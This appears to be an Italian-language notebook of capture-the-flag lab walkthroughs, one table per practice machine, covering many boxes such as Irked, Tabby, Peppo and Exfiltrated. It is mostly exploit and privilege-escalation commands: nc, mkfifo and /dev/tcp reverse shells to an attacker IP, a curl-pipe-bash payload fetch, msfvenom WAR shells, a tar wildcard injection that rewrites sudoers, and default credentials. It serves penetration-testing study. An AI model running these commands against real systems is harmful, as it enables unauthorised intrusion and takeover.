| **Ottenimento dell'accesso root**                | Attesa dell'esecuzione del cron job                                                                                                                                                                                | In attesa di connessione dalla reverse shell                      |

- [writeup](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)
### CmesS

| üß† Azione        | üíª Comando Chiave                                                                                                                                                                                                           | **üìù Output / Scopo**                                                                                                                      |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| **Sottodominio** |                                                                                                                                                                                                                             | Tra i sottodimini troviamo `dev.cmss.thm` dove sono presenti le credenziali per la pagina `/login`                                         |
| **Gila CMS**     | 1. `python 51569.py`                                                                                                                                                                                                        | Il servizio *Gila CMS* √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/51569) con la *1.* inserendo i parametri richiesti        |
| **Backup**       |                                                                                                                                                                                                                             | Nel path `/opt/andre_backup` troviamo le credenziali dell'utente andre                                                                     |
| **Wildcard**     | 1. `echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > payload.sh`<br>2. `chmod +x payload.sh`<br>3. `echo "" > '--checkpoint=1'`<br>4. `echo "" > '--checkpoint-action=exec=sh payload.sh'`<br>5. `sudo su`<br> | Notiamo tramite `/etc/crontab` che il root esegue il comando `tar` tramite `cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`. |

## IRC

### Irked

| üß† Azione           | üíª Comando Chiave                                                                                                                                                         | **üìù Output / Scopo**                                                                                                                                                                                       |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **IRC connessione** | 1. `nc -vn IP_TARGET 6697`<br>2. `PASS wealllikedebian`<br>3. `NICK patrick`<br>4. `USER test1 test2 <IP> :test3`                                                         | Mi connetto alla porta IRC con credenziali standard                                                                                                                                                         |
| **Versione IRC**    | `INFO`                                                                                                                                                                    | Ottengo la versione della IRC che √® <br>`Unreal3.2.8.1`<br>                                                                                                                                                 |
| **RCE**             | 1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`<br>2.`show targets`<br>3. `set target 0`<br>4. `show payloads`<br>5. `set payload 6`<br>6. `show options`<br>7. `run` | Con msfconsole sfrutto la [vulnerabilit√†](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/)                                                                                    |
| **Steghide**        | 1. `steghide extract -sf img.jpeg`                                                                                                                                        | Nella cartella `/home/djmardov/.backup` trovo un riferimento a `steghide` dunque capisco che devo scaricare l'immagine ad inizio pagina e trovo una password. La utilizzo per entrare in ssh con `djmardov` |
| **Root**            | 1. `find / -perm /6000 2>/dev/null`<br>2. `/usr/bin/viewuser`<br>3. `echo '/bin/bash > listusers'`                                                                        | Tra i file SUID trovo `viewuser` che esegue un file in `/tmp` dunque lo sovrascrivo in modo che esegua una shell                                                                                            |
- [writeup](https://medium.com/@sam_0x0/irked-hackthebox-write-up-59dad5b53dd3)

## Web Server

### Knife

| üß† Azione        | üíª Comando Chiave                                                                                                                                  | **üìù Output / Scopo**                                                                              |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| **Exploit**      | 1. `searchsploit -m 49933.py`<br>2. `User-Agent: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_ATTACCANTE 4444 >/tmp/f');` | Da Burpsuite trovo `PHP/8.1.0-dev` e con `searchsploit` √® vulnerabile a RCE tramite richiesta REST |
| **Versione IRC** | 1. `sudo -l`<br>2. `sudo /usr/bin/knife`                                                                                                           | Divento root<br>                                                                                   |

### Shocker

| üß† Azione               | üíª Comando / Metodo                                                 | üìù Output / Scopo                                                                                                                             |
| ----------------------- | ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fuzzing directories** | 1. `msfconsole`<br>2. `use multi/http/apache_mod_cgi_bash_env_exec` | Troviamo il file */cgi-bin/user.sh* googlando troviamo che Apache+CGI √® vulnearbile a [Shellshock](https://www.exploit-db.com/exploits/34895) |
| **Root**                | 1. `sudo -l`<br>2. `sudo perl -e 'exec "/bin/sh";'<br>`             | Secondo [GTOFObins](https://gtfobins.github.io/gtfobins/perl/#sudo) il comando *perl* √® vulnerabile                                           |

### Traverxec

| üß† Azione          | üíª Comando / Metodo                                                                                                         | üìù Output / Scopo                                                                                                                                                                                                  |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Nostromo 1.9.6** | `./CVE-2019-16278.sh 127.0.0.1 8080 "bash -c 'bash -i >& /dev/tcp/IP_KALI/PORT 0>&1'"`<br>`<br>                             | Il web server √® `Nostromo 1.9.6` che √® vulnerabile a [RCE](https://github.com/jas502n/CVE-2019-16278?tab=readme-ov-file)                                                                                           |
| **SSH**            | 1. `ssh2john hash > key`<br>2. `john --wordlist=/usr/share/wordlists/rockyou.txt key`<br>3. `ssh -i id_rsa david@IP_TARGET` | Nel path `/var/nostromo/conf/nhttpd.conf` √® presente un riferimento ad una cartella dell'utente *david* dove √® presente il backup della chiave SSH. La cracchiamo poich√© utilizza passphrase ed otteniamo `hunter` |
| **Root**           | 1. `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`<br>2. `!/bin/sh`<br>                                          | Nella cartella `/bin/server_stats.sh` dove vediamo che utilizza il comando sudo che secondo [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) √® vulnerabile                                         |


### Tabby

| üß† Azione               | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **LFI**                 | <br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | La web application *Mega Hosting* √® affetta da LFI nel path `/news.php?file=` pertanto possiamo utilizzare la vulnerabilit√† per trovare le credenziali del web server `Tomcat 9.0.31` sul path `/manager`.<br>Per trovare il file ci aiutiamo con [Debian](https://packages.debian.org/bullseye/all/tomcat9/filelist) che contiene i percorsi ai file. Il file di nostro interesse √® `/usr/share/tomcat9/etc/tomcat-users.xml` in quanto contiene le credenziali che ci servono |
| **Role manager script** | 1. `msfvenom -p java/shell_reverse_tcp lhost=IP_KALI lport=4444 -f war -o pwn.war`<br>2. `nc -lvnp 4444`<br>3. `curl -v -u 'tomcat:$3cureP4s5w0rd123!' --upload-file pwn.war "http://IP_TARGET:8080/manager/text/deploy?path=/hack&update=true"`<br>4. `curl [http://IP_TARGET:8080/hack](http://10.10.10.194:8080/hack)`                                                                                                                                                                                                       | Dal file citato precedentemente notiamo che l'account √® ha ruolo `script manager` e ci√≤ ci permette di eseguire una [Reverse Shell](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00)                                                                                                                                                                                                                                                      |
| **Cracking**            | 1. `zip2john file.zip > hash`<br>2. `john --wordlist/usr/share/wordlists/rockyou.txt hash`                                                                                                                                                                                                                                                                                                                                                                                                                                      | Troviamo un file zip con password, dunque lo carichiamo sulla nostra macchina e lo cracchiamo. Usiamo la password per diventare utente `ash`                                                                                                                                                                                                                                                                                                                                    |
| **LXD**                 | 1. *KALI:* `git clone https://github.com/saghul/lxd-alpine-builder.git`<br>2. *TARGET* `wget 10.17.12.67/alpine-v3.13-x86_64-20210218_0139.tar.gz`<br>3. *TARGET* `lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage`<br>4. *TARGET* `lxc image list`<br>5. *TARGET* `lxc init myimage ignite -c security.privileged=true`<br>6.*TARGET* `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`<br>7. *TARGET* `lxc start ignite`<br>8. *TARGET* `lxc exec ignite /bin/sh` | L'utente `ash` appartiene al gruppo `lxd` che sappiamo essere vulnerabile a [privilege escalation](https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63)                                                                                                                                                                                                                                                                                       |


## RCE

### Nibbles

| üß† Azione                  | üíª Comando / Metodo                                                                                                                    | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                     |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostgreSQL 11.3 - 11.9** | `python3 cve-2019-9193.py -i debian -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP_KALI 4444 >/tmp/f'`<br><br> | Dalla scansione risulta che utilizza *PostgreSQL 11.3 - 11.9* che √® vulnerabile a [RCE](https://github.com/b4keSn4ke/CVE-2019-9193) quindi avviamo una reverse shell<br><br>NB: le credenziali usate per la connessione in remoto sono quelle di default `postgres:postgres`.<br><br>NB2: puoi trovare l'exploit a mano in [[#Peppo]] |
| **SUID**                   | 1. `find / -perm -4000 2>/dev/null`<br>2. `./find . -exec /bin/sh -p \; -quit`                                                         | Tra i file SUID trovo che √® presente `find` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/find/) √® vulnerabile                                                                                                                                                                                                           |
-  [writeup](https://dylanrholloway.com/proving-grounds-nibbles-write-up/)
### ZenPhoto

| üß† Azione            | üíª Comando / Metodo                                                                                             | üìù Output / Scopo                                                                                                                                                                                                                  |
| -------------------- | --------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ZenPhoto 1.4.1.4** | 1. `python3 IP_TARGET /test/`<br>2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI 23 >/tmp/f`<br> | Navigando sul web troviamo *Zenphoto 1.4.1.4* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/18083?source=post_page-----fe099ba949bc---------------------------------------). Con la *2.* avviamo una reverse shell |
| **Operative System** | 1. `gcc exploit.c -o exploit`<br>2. `./exploit`                                                                 | Con linpeas.sh notiamo che √® vulnerabile a [kernel exploit](https://github.com/lucyoa/kernel-exploits/blob/master/rds/rds.c)                                                                                                       |

### Clue

| üß† Azione         | üíª Comando / Metodo                                                                                                                                           | üìù Output / Scopo                                                                                                                                                                                                                                                                                                      |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Cassandra Web** | `python3 cassandra.py IP_TARGET /etc/passwd`<br>                                                                                                              | Navigando sulla porta 3000 troviamo *Cassandra Web* che √® vulnerabile a [LFI](https://www.exploit-db.com/exploits/49362)                                                                                                                                                                                               |
| **Freeswitch**    | `python3 cassandra.py IP_TARGET /etc/freeswitch/autoload_conigs/event_socket.conf.xml`                                                                        | Poich√© √® presente *Freeswitch* possiamo ricavarci le credenziali da `/etc/freeswitch/autoload_configs/event_socket.conf.xml`                                                                                                                                                                                           |
| **RCE**           | 1. `python3 freeswitch.py IP_TARGET whoami`<br>2. `python3 freeswitch.py IP_TARGET "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI 3000 >/tmp/f"` | Cambiando la password di default nel codice del parametro `PASSWORD=` con quella trovata nella sezione precedente, possiamo applicare la [RCE](https://www.exploit-db.com/exploits/47799) associata a *Freeswitch* ed avviare una reverse shell con la *2.*                                                            |
| **SSH**           | 1. `python3 cassandra.py IP_TARGET /home/cassie/id_rsa`<br>2. `chmod 600 id_rsa`<br>3. `ssh -i id_rsa root@IP_TARGET`                                         | Una volta dentro notiamo che nel `path /home/cassie/id_rsa` √® presente una chiave privata SSH ma non √® leggibile con l'attuale utente. Utilizziamo la vulnerabilit√† LFI vista nella prima sezione *1.* cos√¨ da cambiare l'utente in cassie e quindi leggerle la chiave.<br><br>La chiave √® utilizzata dall'utente root |

### Extplorer

| üß† Azione      | üíª Comando / Metodo                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Extplorer**  |                                                                                          | Con Fuzzing Directories troviamo *Extplorer* che √® accessibile tramite credenziali di default `admin:admin`. In `/filemanager/config/.htusers.php` troviamo le credenziali di un altro utente di nome dora. <br><br>Secondo ExploitDB a [RCE](https://github.com/tristao-io/CVE-2023-27842) inseriamo in `/index.php` la [reverse shell di pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) e navighiamo la pagina |
| **Cracking**   | `john hash --wordlists=/usr/share/wordlists/rockyou.txt`                                 | Cracchiamo la password di dora                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Disk group** | 1. `df -h`<br>2. `debugfs /dev/mapper/ubuntu--vg-ubuntu--lv`<br>3. `cat /root/proof.txt` | Dora appartiene al gruppo `disk` dunque utilizzo questa [guida](https://www.youtube.com/watch?v=hRW6jmnycuo&ab_channel=PCPLALEX) per diventare root. Con la *1.* controllo dov'√® montato il filesystem e con la *2.* vi acceso con permessi root                                                                                                                                                                                                                       |

### Walla

| üß† Azione               | üíª Comando / Metodo                                                                      | üìù Output / Scopo                                                                                                                                                                                                                                            |
| ----------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Default Credentials** |                                                                                          | Tramite l'enumerazione troviamo il servizio *Raspap* sulla porta 8091. E' accessibile tramite le credenziali di default `admin:secret`                                                                                                                       |
| **RCE**                 | 1. `python3 IP_TARGET PORT IP_KALI KALI_PORT PASSWORD 3`                                 | Scarichiamo la [RCE](https://github.com/gerbsec/CVE-2020-24572-POC/blob/main/exploit.py) ed eseguiamolo con la *1.*                                                                                                                                          |
| **SUDO**                | 1. `sudo -l`<br>2. `echo 'import os; os.setuid(0) os.system("/bin/sh")' > wifi_reset.py` | Tra i file SUDO troviamo che possiamo eseguire `/usr/bin/python /home/walter/wifi_reset.py`. La cartella `walter` pu√≤ essere modificata dall'utente attuale dunque cancelliamo il file `wifi-reset.py` e facciamone uno nostro con una shell come nella *2.* |

### Sybaris

| üß† Azione                | üíª Comando / Metodo                                                                                                                                                                    | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                      |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Redis 5.0.9**          | 1. `git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand`<br>2. `cd RedisModules-ExecuteCommand`<br>3. *INSERIRE:*`nano /src/module.c` <br>4. `make -C ./src`             | Tra le porte aperta abbiamo la `6379` in cui gira *Redis 5.0.9* che √® vulnerabile a [RCE](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand), scarichiamo con la *1.* e *2.* prepariamo con la *3.* inseriamo `#include <string.h>`  e `#include <arpa/inet.h>`, *4.* e *5.* il modulo da caricare. Questo modulo permette di eseguire comandi sulla porta redis |
| **FTP**                  | 1. `put module.so`                                                                                                                                                                     | Per sfruttare la vulnerabilit√† di Redis abbiamo bisogno di caricare il file in un path conosciuto, fortunatamente la porta ftp permette di caricare file *1.*                                                                                                                                                                                                          |
| **RCE**                  | 1. `redis-cli -h IP_TARGET`<br>2. `MODULE LOAD /var/ftp/pub/module.so`<br>3. `system.exec "id"`<br>4. `nc -lvnp PORT`<br>5. `system.exec "/bin/bash -i >& /dev/tcp/IP_KALI/PORT 0>&1"` | Colleghiamoci a redis con la *1.*, carichiamo il modulo precedentemente caricato con la *2.*, eseguiamo il PoC con la *3.* e con la *5.* avviamo la reverse shell                                                                                                                                                                                                      |
| **PwnKit CVE-2021-4034** | 1. `put cve-2021-4034.py`<br>2. `python /var/ftp/pub/cve-2021-4034.py`                                                                                                                 | Linpeas ci dice che √® vulnerabile a [CVE-2021-4034](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py) . Carichiamo su FTP perch√© la macchina non ci permette di caricare altri strumenti ed avviamola                                                                                                                        |

### Peppo

| üß† Azione                | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                                                                        | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostrgreSQL DB 9.6.0** | 1. `psql -h IP_TARGET -U USER -p PORT`<br>2. `DROP TABLE IF EXISTS cmd_exec;`<br>3. `CREATE TABLE cmd_exec(cmd_output_ text);`<br>4. `COPY cmd_exec FROM PROGRAM 'id';`<br>5. `SELECT * FROM cmd_exec;`<br><br>---- oneliner ----<br>`DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_KALI/8000 0>&1"';SELECT * FROM cmd_exec;` | Tramite il comando *1.* ci colleghiamo al database in remoto con le credenziali di default `postgres:postgres`.<br>Seguendo questa [guida](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html#rce) vediamo che √® vulnerabile a RCE. Facciamo la prova con *2.*, con *3.* creaiamo una tabella con dentro il comando, con *4.* inseriamo in nostro comando e con *5.* lo eseguiamo<br><br>NB: modificare la *5.* per ottenere una reverse shell |
| **SSH**                  | 1. `ssh eleanor@IP_TARGET` (pass: eleanor)<br>                                                                                                                                                                                                                                                                                                                                                                             | La sezione precedente ai fini dell'esercizio non porta da nessuna parte in quanto bisogna entrare da SSH come in *1.* per essere l'utente eleanor                                                                                                                                                                                                                                                                                                                                  |
| **Restricted shell**     | 1. `ed`<br>2. `!/bin/bash`                                                                                                                                                                                                                                                                                                                                                                                                 | Quando proviamo ad eseguire i comandi base notiamoche ci restituisce un errore, come se non trovasse il comando. E' ovvio che siamo in una *restricted shell*, per bypassarla avviamo il notepad con la *1.* ed una shell interattiva con la *2.*                                                                                                                                                                                                                                  |
| **Docker**               | 1. `docker images`<br>2. `docker run -v /:/mnt --rm -it DOCKER_IMAGE chroot /mnt sh`                                                                                                                                                                                                                                                                                                                                       | Eseguendo `id` notiamo che siamo nel gruppo *docker* dunque possiamo applicare la *1.* per vedere i container attivi ed la *2.* per avviare una shell come root; proprio come dice [GTFObins](https://gtfobins.github.io/gtfobins/docker/#shell)                                                                                                                                                                                                                                   |

### Astronaut

| üß† Azione    | üíª Comando / Metodo                                                                   | üìù Output / Scopo                                                                                                                                                                                    |
| ------------ | ------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Grav CMS** |                                                                                       | Navigando la porta HTTP troviamo  `http://IP_TAGET/grav-admin/admin` dove √® presente la pagina di login di  `Grav CMS` che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/49973)          |
| **RCE**      | 1. *CODFICARE IN BASE64:* `curl http://IP_KALI/rev_shell.sh \| bash`                  | Modifichiamo il parametro `payload` e carichiamolo in base64 come indicato sulla pagina *1.* cos√¨ da prelevare il file `rev_shell.sh` e farci entrare.                                               |
| **SUID**     | 1. `find / -perm -4000 2>/dev/null`<br>2. `./php -r "pcntl_exec('/bin/sh', ['-p']);"` | Una volta dentro vediamo con la *1.* i file SUID. Tra quei file troviamo binario `php` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/php/#suid) ed avviamolo la *2.* per diventare root |

### Marketing

| üß† Azione                 | üíª Comando / Metodo                                                                                                                                                    | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Sottodominio nascosto** |                                                                                                                                                                        | Facendo fuzzing directories trovo `/old` una pagina dov'√® presente nel suo codice sorgente il sottodominio `customers-survey.marketing.pg` dunque lo aggiungiamo nel file hosts e lo visitiamo                                                                                                                                                                                                                                            |
| **Lime Survey**           | 1. [guida](https://nasirli.medium.com/limesurvey-6-6-4-rce-0a54c2c09c5e)<br>2. `nc -lvnp PORT`<br>3. `python3 exploit.py URL USER PASS PORT`                           | In questo sottodominio, facendo fuzzing directories, troviamo la pagina di login a *LimeSurvey* che √® vulnerabile a [RCE](https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE) e seguendo la guida consigliata nel link stesso ovvero [questa](https://nasirli.medium.com/limesurvey-6-6-4-rce-0a54c2c09c5e) riusciamo ad ottenere il primo accesso<br><br>NB: lo username e pasword utilizzate sono state quelle di default `admin:password` |
| **Credentials**           |                                                                                                                                                                        | Cercando in `/var/www/html/application/config/config.php` dove troviamo le credenziali per il database. <br>Utilizziamo le stesse credenziali per `t.miller:EzPwz2022_dev1$$23!!`                                                                                                                                                                                                                                                         |
| **SUDO**                  | 1. `strings /var/lib/mlocate/mlocate.db \| grep -A 3 -B 3`<br>2. `ln -sf /home/m.sander/personal/creds-for-2022.txt abc`<br>3. `sudo -u m.sander /usr/bin/sync.sh abc` | Tra file SUDO troviamo un file avviato da `m.sander` ovvero `/etc/backup.sh` che applica la differenza tra due file e li mostra a video. Poich√© l'utente attuale appartiene al gruppo `mlocate` allora possiamo fare la *1.* per vedere quali file sono presenti nella cartella di `m.sander` cos√¨ da leggerli col file SUDO. Notiamo che un file conenente le credenziali √® al suo interno quindi usiamo la *2.* e *3.* per leggerlo     |
| **Root**                  | 1. `sudo su`                                                                                                                                                           | Una volta diventati `m.sander` abbiamo i permessi SUDO per tutto quindi facciamo la *1.*                                                                                                                                                                                                                                                                                                                                                  |

- [writeup](https://medium.com/@ardian.danny/oscp-practice-series-32-proving-grounds-marketing-bf040837eeff)


### Exfiltrated

| üß† Azione          | üíª Comando / Metodo                                                                                                                                            | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SubrionCMS**     |                                                                                                                                                                | Con un fuzzing directories il path `/panel` dove vediamo che utilizza *Subrion CMS* . Con le credenziali di default `admin:admin` riusciamo ad avere accesso al pannello amministratori                                                                                                                                                                                                                                                                                                                                                                           |
| **RCE**            | 1. `python3 SubrionRCE.py -u http://IP_TARGET/panel -l admin -p admin`<br>2.`http://IP_TARGET/uploads/FILE_NAME.phar?cmd=curl+http://IP_TARGET/shell.sh\|bash` | Vediamo che la versione √® *Subrion CMS 4.3.2* che √® vulnerabile a [RCE](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE/tree/main). Avviamo il codice con la *1.* Modifichiamo il codice in modo da intercettare la richiesta con il proxies e notiamo che viene caricata una webshell nel seguente path `http://IP_TARGET/uploads/FILE_NAME.phar?cmd=id`. Navighiamo la *2.* per scaricare una reverse shell contente `#! /bin/bash`<br>`/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.161/22 0>&1"`                                                  |
| **Subrion config** |                                                                                                                                                                | Nel file di configurazione `/var/www/html/subrion/includes/config.inc.php` troviamo le credenziali per l'accesso al DB, ma si rilevano inutili ai fini della macchina                                                                                                                                                                                                                                                                                                                                                                                             |
| **Cronjob**        | 1. *KALI:* `wget https://www.exploit-db.com/exploits/50911`<br>2. *KALI:* `python3 50911.py -s IP_KALI PORT`<br>3. *TARGET:*`wget http://IP_KALI/image.jpg`    | Tra i processi in `/etc/crontab` troviamo un file che esegue come root il comando `exiftool` su una cartella. Possiamo utilizzare questo [Command Injection](https://www.exploit-db.com/exploits/50911) per far eseguire al comando `exiftool` una reverse shell. <br>Con la *1.* scarichiamo il file in locale e con la *2.* creiamo un file avente come metadati una reverse shell che viene eseguita nel momento in cui si utilizza `exiftool` sull'immagine. Con la *3.* carichiamo il file sulla macchina target ed attendiamo che il cronjob esegua il file |


### Thompson

| üß† Azione               | üíª Comando / Metodo                                                                                                                  | üìù Output / Scopo                                                                                                                                                                                                                                                                                                         |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Default credentials** |                                                                                                                                      | Provando ad entrare nel pannello `/manager` con le credenziali di default `tomcat:s3cret` e riusciamo ad entare                                                                                                                                                                                                           |
| **Reverse Shell**       | 1. `msfvenom -p java/shell_reverse_tcp lhost=IP_KALI lport=PORT -f war -o pwn.war`<br>2. `nc -lvnp PORT`<br>                         | Seguendo questo [video](https://www.youtube.com/watch?v=qaJyYxlEBHc&ab_channel=CCNADailyTIPS): generiamo una reverse shell con estensione `.war` con la *1.*. Apriamo una porta in locale con la *2.*. Uplodiamo dall'interfaccia web la shell, quando apparir√† il suo nome sulla pagina clicchiamoci sopra. Siamo dentro |
| **Cronjob**             | 1. `echo "#! /bin/bash" > file.sh`<br>2. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc IP_KALI PORT >/tmp/f" >> file.sh` | Controllando il file `/etc/crontb` notiamo che il root esegue un file che √® modificabile dall'utente attuale. Modifichiamolo con la *1.* e *2.* in modo da avviare una reverse shell                                                                                                                                      |

### Wombo

| üß† Azione       | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                | üìù Output / Scopo                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Redis 5.0.9** | 1. `wget https://raw.githubusercontent.com/Ridter/redis-rce/refs/heads/master/redis-rce.py`<br>2. `wget https://github.com/n0b0dyCN/redis-rogue-server/raw/refs/heads/master/exp.so`<br>3. `python3 redis-rce.py -r IP_TARGET -L IP_KALI -f exp.so -a PASS -P 80 -v` (scegli la reverse shell appena te lo chiede) | Con la scansione sulle porte troviamo che √® presente il servizio *Redis 5.0.9*.<br>Scarichiamo con la *1.* lo [script](https://raw.githubusercontent.com/Ridter/redis-rce/refs/heads/master/redis-rce.py) per RCE su Redis. Scarichiamo con la *2.* il git dov'√® presente il modulo [exp.so](https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so) ed infine usiamo la *3.* per avviare una shell |

### Flu
| üß† Azione                       | üíª Comando / Metodo                                                                                                                                                                                                                                                                                                                                                             | üìù Output / Scopo                                                                                                                                                                                                    |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Atlassian Confluence 7.13.6** | 1. `wget https://raw.githubusercontent.com/jbaines-r7/through_the_wire/refs/heads/main/through_the_wire.py`<br>2. `python3 through_the_wire.py --rhost IP_TARGET --rport RPORT --lhost IP_KALI --protocol http:// --read-file /etc/passwd`<br>3. `python3 through_the_wire.py --rhost IP_TARGET --rport RPORT --lhost IP_KALI --lport LPORT --protocol http:// --reverse-shell` | Il sito utilizza *Atlassian Confluence 7.13.6* che √® vulnerabile a [RCE](https://github.com/jbaines-r7/through_the_wire). Scarichimolo con la *1.*, vediamo la PoC con la *2.* e sfrud avviamo una shell con la *3.* |
| **Pspy**                        | 1. `./pspy64s`<br>2. *KALI:*`nc -lvnp LPORT`<br>3. `echo -e "#! /bin/bash\n/bin/bash -i >& /dev/tcp/IP_KALI/LPORT 0>&1" > log-backup.sh`                                                                                                                                                                                                                                        | Avviando *pspy* sulla macchina target ci accorgiamo che il root esegue il file `/opt/log-backup.sh` su cui abbiamo i permessi di scrittura con l'utente attuale                                                      |

- [writeup](https://medium.com/@0xrave/ctf-200-08-offsec-proving-grounds-practice-labor-day-ctf-machine-walkthrough-bee721403cd4)

### Roquefort

| üß† Azione           | üíª Comando / Metodo                                                              | üìù Output / Scopo                                                                                                                                                                                      |
| ------------------- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Gitea 1.7.5 RCE** | 1. `python3 49383.py`                                                            | Sulla porta `3000` √® presente il servizio *Gitea 1.7.5* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/49383).<br><br>Cambiamo le prime righe in modo da poter avviare la shell         |
| **PATH**            |                                                                                  | Enumerando con *linpeas.sh* notiamo che abbiamo i permessi di scrittura in una cartella presente nella varibile globale PATH e questo ci permetterebbe di inserire nuovi programmi richiamati dal root |
